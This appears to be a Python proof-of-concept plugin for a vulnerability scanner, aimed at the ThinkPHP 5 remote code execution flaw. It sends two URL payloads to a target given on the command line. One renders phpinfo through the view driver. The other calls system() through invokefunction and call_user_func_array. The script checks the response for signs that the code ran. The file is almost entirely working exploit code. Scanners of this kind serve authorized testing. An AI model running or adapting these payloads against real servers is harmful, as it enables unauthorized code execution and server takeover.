#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import random
import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "Thinkphp 5 代码执行",
        "desc": "攻击者通过此漏洞可代码执行，进而入侵控制服务器。",
        "grade": "高",
        "type": "web",
        "keyword": "tag:thinkphp5 language:php",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    payloads = [r"/index.php?s=index/\think\view\driver\Php/display&content=<?php%20phpinfo();?>",r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'"]
    for payload in payloads:
        try:
            r = requests.get(
                url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}{payload}', 
                headers=headers,
                timeout=timeout, 
                verify=False
                )
            if r.status_code == 200 and "allow_url_fopen" in r.text:
                return True
        except Exception:
            return 

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

